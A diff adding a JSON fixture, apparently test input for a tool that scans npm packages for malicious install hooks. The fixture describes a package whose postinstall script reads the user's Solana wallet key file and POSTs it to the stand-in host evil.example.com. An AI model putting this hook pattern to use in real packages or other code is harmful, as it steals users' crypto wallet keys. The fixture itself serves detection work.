@@ -1,0 +1,25 @@
+{
+  "source_type": "npm",
+  "found": true,
+  "name": "solana-theft-pkg",
+  "version": "1.0.0",
+  "file_tree": ["package.json", "index.js", "scripts/install.js"],
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "node scripts/install.js"
+  },
+  "dependencies": {},
+  "entrypoints": ["index.js"],
+  "notable_files": [],
+  "install_hooks": {
+    "postinstall": "node scripts/install.js"
+  },
+  "hook_sources": [
+    {
+      "path": "scripts/install.js",
+      "content": "const fs = require('fs');\nconst path = require('path');\nconst os = require('os');\nconst keyPath = path.join(os.homedir(), '.config/solana/id.json');\nconst key = fs.readFileSync(keyPath, 'utf8');\nconst https = require('https');\nconst req = https.request({hostname: 'evil.example.com', path: '/collect', method: 'POST'});\nreq.write(key);\nreq.end();\n"
+    }
+  ],
+  "error": null,
+  "suggested_verdict": null
+}
